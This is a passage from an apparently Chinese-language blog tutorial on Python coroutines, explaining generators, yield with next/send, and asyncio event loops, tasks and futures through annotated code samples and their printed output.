<li>协程B执行结束后同A的方式放弃控制权给执行器，执行器通过A&#x2F;generator对象将控制权分发至协程A</li>
<li>周而复始…</li>
</ul>
</li>
<li>NOTE:<ul>
<li>协程的切换只能通过执行器操作generator对象实现</li>
</ul>
</li>
</ul>
<h4 id="generator对象"><a href="#generator对象" class="headerlink" title="generator对象"></a>generator对象</h4><p><a href="https://stackoverflow.com/questions/231767/what-does-the-yield-keyword-do">What does the “yield” keyword do?</a></p>
<ul>
<li>Iterable 可迭代的，适合<code>for...in</code>语法<ul>
<li>list&#x2F;string&#x2F;…  在内存中存储所有值</li>
<li>generator        迭代时动态生成值，不需要在内存中存储所有值，但只能迭代一次<ul>
<li>:) <em>generator generates electricity but does not store energy (发电机发电但不存储电能)</em></li>
<li>:) <em>black blind man breaks corn (黑瞎子掰苞米 - 边干边丢)</em></li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># iterable: list</span></span><br><span class="line">mylist = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> mylist:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># iterable: list comprehension</span></span><br><span class="line">mylist = [x*x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> mylist:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># iterable: generator comprehension</span></span><br><span class="line">mygenerator = (x*x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> mygenerator:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>

<h4 id="yield关键字"><a href="#yield关键字" class="headerlink" title="yield关键字"></a>yield关键字</h4><p><a href="https://stackoverflow.com/questions/19302530/python-generator-send-function-purpose/19302700#19302700">python generator “send” function purpose?</a></p>
<ul>
<li>Python2.x使用yield或gevent模块；</li>
<li>yield关键字由两个含义：<ol>
<li>生产某物，例如 to yield corn (生产玉米)</li>
<li>停下来让别的事情继续，例如 cars yielding to pedestrians (车辆给行人让路)</li>
</ol>
</li>
<li>yield函数返回generator对象，配合<code>in</code>操作可以避免迭代到末尾时<code>arise StopIteration</code></li>
</ul>
<div class="tabs" id="yield"><ul class="nav-tabs"><li class="tab active"><a href="#yield-1">yield&next</a></li><li class="tab"><a href="#yield-2">yield&send</a></li><li class="tab"><a href="#yield-3">yield&in</a></li><li class="tab"><a href="#yield-4">producer/consumer</a></li></ul><div class="tab-content"><div class="tab-pane active" id="yield-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># For python version 3.2, matcher.__next__() or next(matcher).</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createGenerator</span>():</span><br><span class="line">    mylist = <span class="built_in">range</span>(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> mylist:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">yield</span> i*i</span><br><span class="line">        <span class="keyword">except</span> GeneratorExit:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;GeneratorExit&quot;</span>)</span><br><span class="line"></span><br><span class="line">gm = createGenerator()</span><br><span class="line"><span class="built_in">print</span>(gm)             <span class="comment"># &lt;generator object createGenerator at 0x00000202EDA8A3C0&gt;</span></span><br><span class="line"><span class="built_in">print</span>(gm.__next__())  <span class="comment"># 0</span></span><br><span class="line"><span class="built_in">print</span>(gm.send(<span class="literal">None</span>))  <span class="comment"># 1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gm))       <span class="comment"># 4</span></span><br><span class="line">gm.close()            <span class="comment"># GeneratorExit</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gm))       <span class="comment"># Exception: StopIteration</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="yield-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># For python version 3.2, matcher.__next__() or next(matcher).</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createGenerator</span>():</span><br><span class="line">    mylist = <span class="built_in">range</span>(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> mylist:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">yield</span> i*i</span><br><span class="line">        <span class="keyword">except</span> GeneratorExit:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;GeneratorExit&quot;</span>)</span><br><span class="line"></span><br><span class="line">gm = createGenerator()</span><br><span class="line"><span class="built_in">print</span>(gm)             <span class="comment"># &lt;generator object createGenerator at 0x00000202EDA8A3C0&gt;</span></span><br><span class="line"><span class="built_in">print</span>(gm.send(<span class="literal">None</span>))  <span class="comment"># 0   only get 0 after yield, but yield does not return immediately</span></span><br><span class="line"><span class="built_in">print</span>(gm.send(<span class="number">100</span>))   <span class="comment"># 1   first yield return 100, and get 1 after yield</span></span><br><span class="line"><span class="built_in">print</span>(gm.send(<span class="number">200</span>))   <span class="comment"># 4   first yield return 200, and get 4 after yield</span></span><br><span class="line">gm.close()            <span class="comment"># GeneratorExit</span></span><br><span class="line"><span class="built_in">print</span>(gm.send(<span class="number">300</span>))   <span class="comment"># Exception: StopIteration</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="yield-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">createGenerator</span>():</span><br><span class="line">    mylist = <span class="built_in">range</span>(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> mylist:</span><br><span class="line">        <span class="keyword">yield</span> i*i</span><br><span class="line"></span><br><span class="line">gm = createGenerator()</span><br><span class="line"><span class="built_in">print</span>(gm)             <span class="comment"># &lt;generator object createGenerator at 0x00000202EDA8A3C0&gt;</span></span><br><span class="line"><span class="built_in">print</span>(gm.__next__())  <span class="comment"># 0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(gm))       <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> gm:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;&lt;<span class="subst">&#123;i&#125;</span>&gt;&quot;</span>)   <span class="comment"># &lt;4&gt;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="yield-4"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">consumer</span>():</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    rets = &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="string">&quot;Prepare&quot;</span>,</span><br><span class="line">        <span class="number">1</span>: <span class="string">&quot;Ok&quot;</span>,</span><br><span class="line">        <span class="number">2</span>: <span class="string">&quot;Finish&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = <span class="keyword">yield</span> rets[i]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;c.p_REQ.<span class="subst">&#123;data&#125;</span>&quot;</span>)        <span class="comment"># c.p_REQ.0/1/2</span></span><br><span class="line">        i = <span class="number">1</span> <span class="keyword">if</span> data &gt;= <span class="number">0</span> <span class="keyword">else</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">producer</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;p.c_<span class="subst">&#123;c.send(<span class="literal">None</span>)&#125;</span>&quot;</span>)        <span class="comment"># p.c_Prepare</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;p.c_RSP.<span class="subst">&#123;c.send(i)&#125;</span>&quot;</span>)   <span class="comment"># p.c_RSP.Ok</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;p.c_RSP.<span class="subst">&#123;c.send(-<span class="number">1</span>)&#125;</span>&quot;</span>)      <span class="comment"># p.c_RSP.Finish</span></span><br><span class="line">    c.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    c = consumer()</span><br><span class="line">    producer(c)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">p.c_Prepare</span><br><span class="line">c.p_REQ<span class="number">.0</span></span><br><span class="line">p.c_RSP.Ok</span><br><span class="line">c.p_REQ<span class="number">.1</span></span><br><span class="line">p.c_RSP.Ok</span><br><span class="line">c.p_REQ<span class="number">.2</span></span><br><span class="line">p.c_RSP.Ok</span><br><span class="line">c.p_REQ.-<span class="number">1</span></span><br><span class="line">p.c_RSP.Finish</span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="coroutine-based"><a href="#coroutine-based" class="headerlink" title="coroutine-based"></a>coroutine-based</h3><p><a href="https://docs.python.org/3/library/asyncio-task.html">asyncio - Coroutines and Tasks</a><br><a href="https://docs.python.org/3/library/asyncio-eventloop.html">asyncio - Event Loop</a></p>
<ul>
<li>协程实现：<ul>
<li>协程A通过<code>yield from</code>（python3.3）或<code>await</code>直接放弃控制权给另一个协程B</li>
</ul>
</li>
</ul>
<h4 id="asyncio-basic"><a href="#asyncio-basic" class="headerlink" title="asyncio-basic"></a>asyncio-basic</h4><p><a href="https://stackoverflow.com/questions/49005651/how-does-asyncio-actually-work">How does asyncio actually work?</a></p>
<ul>
<li>Python3.4引入asyncio模块<ul>
<li>协程函数（coroutine function）: 通过<code>async def</code>定义的函数<ul>
<li><code>iscoroutinefunction()</code>判断是否为协程函数</li>
</ul>
</li>
<li>协程对象（coroutine object）: 协程函数的返回值是协程对象<ul>
<li><code>iscoroutine()</code>判断是否为协程对象</li>
</ul>
</li>
<li>只有asyncio的事件循环运行后，协程才会被执行，且协程中调用time.sleep()会阻塞EventLoop，影响其他协程的运行</li>
<li>@asyncio.coroutine（python3.8弃用，use <code>async def</code>）修饰一个函数为coroutine，因此可以在EventLoop中执行</li>
</ul>
</li>
<li>Python3.5引入async&#x2F;await语法；<ul>
<li>将@asyncio.coroutine替换为async</li>
<li>将yield from替换为await</li>
</ul>
</li>
</ul>
<div class="tabs" id="asyncio_basic"><ul class="nav-tabs"><li class="tab active"><a href="#asyncio_basic-1">(X)time.sleep</a></li><li class="tab"><a href="#asyncio_basic-2">yield from</a></li><li class="tab"><a href="#asyncio_basic-3">await</a></li><li class="tab"><a href="#asyncio_basic-4">async&await</a></li><li class="tab"><a href="#asyncio_basic-5">python3.5+</a></li></ul><div class="tab-content"><div class="tab-pane active" id="asyncio_basic-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="meta">@asyncio.coroutine</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">int</span>(time.time())&#125;</span> task<span class="subst">&#123;i&#125;</span> enter&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>) <span class="comment"># should use asyncio.sleep(1)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">int</span>(time.time())&#125;</span> task<span class="subst">&#123;i&#125;</span> exit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    tasks = [task(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line">    loop.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;[Output]</span></span><br><span class="line"><span class="string">1641207269 task2 enter</span></span><br><span class="line"><span class="string">1641207270 task2 exit</span></span><br><span class="line"><span class="string">1641207270 task1 enter</span></span><br><span class="line"><span class="string">1641207271 task1 exit</span></span><br><span class="line"><span class="string">1641207271 task0 enter</span></span><br><span class="line"><span class="string">1641207272 task0 exit</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="asyncio_basic-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="meta">@asyncio.coroutine</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">int</span>(time.time())&#125;</span> task<span class="subst">&#123;i&#125;</span> enter&#x27;</span>)</span><br><span class="line">    r = <span class="keyword">yield</span> <span class="keyword">from</span> asyncio.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">int</span>(time.time())&#125;</span> task<span class="subst">&#123;i&#125;</span> exit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    tasks = [task(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line">    loop.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;[Output]</span></span><br><span class="line"><span class="string">1641207471 task2 enter</span></span><br><span class="line"><span class="string">1641207471 task1 enter</span></span><br><span class="line"><span class="string">1641207471 task0 enter</span></span><br><span class="line"><span class="string">1641207472 task2 exit</span></span><br><span class="line"><span class="string">1641207472 task1 exit</span></span><br><span class="line"><span class="string">1641207472 task0 exit</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="asyncio_basic-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">int</span>(time.time())&#125;</span> task<span class="subst">&#123;i&#125;</span> enter&#x27;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">int</span>(time.time())&#125;</span> task<span class="subst">&#123;i&#125;</span> exit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    tasks = [task(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line">    loop.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;[Output]</span></span><br><span class="line"><span class="string">1641208021 task1 enter</span></span><br><span class="line"><span class="string">1641208021 task2 enter</span></span><br><span class="line"><span class="string">1641208021 task0 enter</span></span><br><span class="line"><span class="string">1641208022 task1 exit</span></span><br><span class="line"><span class="string">1641208022 task2 exit</span></span><br><span class="line"><span class="string">1641208022 task0 exit</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="asyncio_basic-4"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">nested</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="number">42</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(nested())        <span class="comment"># RuntimeWarning: coroutine &#x27;nested&#x27; was never awaited</span></span><br><span class="line">                           <span class="comment"># (A coroutine object is created but not run)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="keyword">await</span> nested())  <span class="comment"># 42</span></span><br><span class="line"></span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="asyncio_basic-5"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func1</span>:</span><br><span class="line">    <span class="keyword">return</span> expression         <span class="comment"># produce a result to the coroutine</span></span><br><span class="line">    <span class="keyword">raise</span> exception           <span class="comment"># raise an exception in the coroutine</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func2</span>:</span><br><span class="line">    result = <span class="keyword">await</span> future     <span class="comment"># until the future is done / raise an exception</span></span><br><span class="line">    result = <span class="keyword">await</span> coroutine  <span class="comment"># wait for another coroutine to produce a result / raise an exception</span></span><br></pre></td></tr></table></figure></div></div></div>

<h4 id="asyncio-task"><a href="#asyncio-task" class="headerlink" title="asyncio-task"></a>asyncio-task</h4><ul>
<li>asyncio基于Task实现并发，一个Task返回一个协程对象</li>
</ul>
<div class="tabs" id="asyncio_task"><ul class="nav-tabs"><li class="tab active"><a href="#asyncio_task-1">task</a></li><li class="tab"><a href="#asyncio_task-2">multitask</a></li><li class="tab"><a href="#asyncio_task-3">task_in_thread</a></li><li class="tab"><a href="#asyncio_task-4">cancel_task</a></li></ul><div class="tab-content"><div class="tab-pane active" id="asyncio_task-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">nested</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="number">42</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    task = asyncio.create_task(nested())</span><br><span class="line">    <span class="built_in">print</span>(<span class="keyword">await</span> task)  <span class="comment"># 42</span></span><br><span class="line"></span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="asyncio_task-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">factorial</span>(<span class="params">name, number</span>):</span><br><span class="line">    f = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, number + <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Task <span class="subst">&#123;name&#125;</span>: Compute factorial(<span class="subst">&#123;number&#125;</span>), currently i=<span class="subst">&#123;i&#125;</span>...&quot;</span>)</span><br><span class="line">        <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</span><br><span class="line">        f *= i</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Task <span class="subst">&#123;name&#125;</span>: factorial(<span class="subst">&#123;number&#125;</span>) = <span class="subst">&#123;f&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    L = <span class="keyword">await</span> asyncio.gather(</span><br><span class="line">        factorial(<span class="string">&quot;A&quot;</span>, <span class="number">2</span>),</span><br><span class="line">        factorial(<span class="string">&quot;B&quot;</span>, <span class="number">3</span>),</span><br><span class="line">        factorial(<span class="string">&quot;C&quot;</span>, <span class="number">4</span>),</span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(L)</span><br><span class="line"></span><br><span class="line">asyncio.run(main())</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;[Output]</span></span><br><span class="line"><span class="string">Task A: Compute factorial(2), currently i=2...</span></span><br><span class="line"><span class="string">Task B: Compute factorial(3), currently i=2...</span></span><br><span class="line"><span class="string">Task C: Compute factorial(4), currently i=2...</span></span><br><span class="line"><span class="string">Task A: factorial(2) = 2</span></span><br><span class="line"><span class="string">Task B: Compute factorial(3), currently i=3...</span></span><br><span class="line"><span class="string">Task C: Compute factorial(4), currently i=3...</span></span><br><span class="line"><span class="string">Task B: factorial(3) = 6</span></span><br><span class="line"><span class="string">Task C: Compute factorial(4), currently i=4...</span></span><br><span class="line"><span class="string">Task C: factorial(4) = 24</span></span><br><span class="line"><span class="string">[2, 6, 24]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="asyncio_task-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">blocking_io</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;start blocking_io at <span class="subst">&#123;time.strftime(<span class="string">&#x27;%X&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;blocking_io complete at <span class="subst">&#123;time.strftime(<span class="string">&#x27;%X&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;started main at <span class="subst">&#123;time.strftime(<span class="string">&#x27;%X&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.gather(</span><br><span class="line">        asyncio.to_thread(blocking_io),</span><br><span class="line">        asyncio.sleep(<span class="number">1</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;finished main at <span class="subst">&#123;time.strftime(<span class="string">&#x27;%X&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">asyncio.run(main())</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;[Output]</span></span><br><span class="line"><span class="string">started main at 19:50:53</span></span><br><span class="line"><span class="string">start blocking_io at 19:50:53</span></span><br><span class="line"><span class="string">blocking_io complete at 19:50:54</span></span><br><span class="line"><span class="string">finished main at 19:50:54</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="asyncio_task-4"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">cancel_me</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;cancel_me(): before sleep&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">await</span> asyncio.sleep(<span class="number">3600</span>) <span class="comment"># 1 hour</span></span><br><span class="line">    <span class="keyword">except</span> asyncio.CancelledError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;cancel_me(): cancel sleep&#x27;</span>)</span><br><span class="line">        <span class="keyword">raise</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;cancel_me(): after sleep&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    task = asyncio.create_task(cancel_me())</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</span><br><span class="line">    task.cancel()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">await</span> task</span><br><span class="line">    <span class="keyword">except</span> asyncio.CancelledError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;main(): cancel_me is cancelled now&quot;</span>)</span><br><span class="line"></span><br><span class="line">asyncio.run(main())</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;[Output]</span></span><br><span class="line"><span class="string">cancel_me(): before sleep</span></span><br><span class="line"><span class="string">cancel_me(): cancel sleep</span></span><br><span class="line"><span class="string">cancel_me(): after sleep</span></span><br><span class="line"><span class="string">main(): cancel_me is cancelled now</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div></div></div>

<h4 id="asyncio-future"><a href="#asyncio-future" class="headerlink" title="asyncio-future"></a>asyncio-future</h4><ul>
<li><code>future</code>是low-level awaitable对象，代表了异步操作的结果</li>
</ul>
<div class="tabs" id="asyncio-future"><ul class="nav-tabs"><li class="tab active"><a href="#asyncio-future-1">future</a></li></ul><div class="tab-content"><div class="tab-pane active" id="asyncio-future-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> concurrent.futures</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blocking_io</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/dev/urandom&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">return</span> f.read(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cpu_bound</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(i * i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span> ** <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    loop = asyncio.get_running_loop()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;time.strftime(<span class="string">&#x27;%X&#x27;</span>)&#125;</span> run event loop&quot;</span>)</span><br><span class="line"></span><br><span class="line">    result = <span class="keyword">await</span> loop.run_in_executor(<span class="literal">None</span>, blocking_io)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;time.strftime(<span class="string">&#x27;%X&#x27;</span>)&#125;</span> default thread pool <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor() <span class="keyword">as</span> pool:</span><br><span class="line">        result = <span class="keyword">await</span> loop.run_in_executor(pool, blocking_io)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;time.strftime(<span class="string">&#x27;%X&#x27;</span>)&#125;</span> custom thread pool <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> concurrent.futures.ProcessPoolExecutor() <span class="keyword">as</span> pool:</span><br><span class="line">        result = <span class="keyword">await</span> loop.run_in_executor(pool, cpu_bound)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;time.strftime(<span class="string">&#x27;%X&#x27;</span>)&#125;</span> custom process pool <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">asyncio.run(main())</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;[Output]</span></span><br><span class="line"><span class="string">19:36:47 run event loop</span></span><br><span class="line"><span class="string">19:36:50 default thread pool b&quot;8\xfd&#x27;\x9a\xa1\x15\x14\xa9\x04C&quot;</span></span><br><span class="line"><span class="string">19:36:53 custom thread pool b&#x27;\x05\x97\x18(;pg\x1c\x8b\x9f&#x27;</span></span><br><span class="line"><span class="string">19:37:01 custom process pool 333333328333333350000000</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div></div></div>

